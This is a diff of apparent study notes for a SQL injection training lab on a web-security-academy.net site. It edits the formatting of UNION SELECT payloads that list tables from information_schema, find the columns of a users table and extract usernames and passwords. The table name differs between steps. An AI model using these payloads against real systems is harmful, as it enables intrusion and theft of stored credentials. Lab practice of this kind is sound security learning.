@@ -12,7 +12,7 @@ we can see from
 that it holds text
 
 (3) get table name
-'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'UNION SELECT table_name, NULL FROM information_schema.tables--
 
 (4) get column name
 https://ac8e1f961f8c2dedc08c010a00b80036.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_qlvwvo%27--
@@ -20,7 +20,7 @@ https://ac8e1f961f8c2dedc08c010a00b80036.web-security-academy.net/filter?categor
 Column: username_pmppme
 Password Column:
 password_tkgaxy
-'+UNION+SELECT+username_pmppme,+password_tkgaxy+FROM+users_tkgaxy--
+'UNION SELECT username_pmppme, password_tkgaxy FROM users_tkgaxy--
 
 (5) Get password 
-'+UNION+SELECT+username_pmppme,+password_tkgaxy+FROM+users_tkgaxy--
+'UNION SELECT username_pmppme,password_tkgaxy FROM users_tkgaxy--
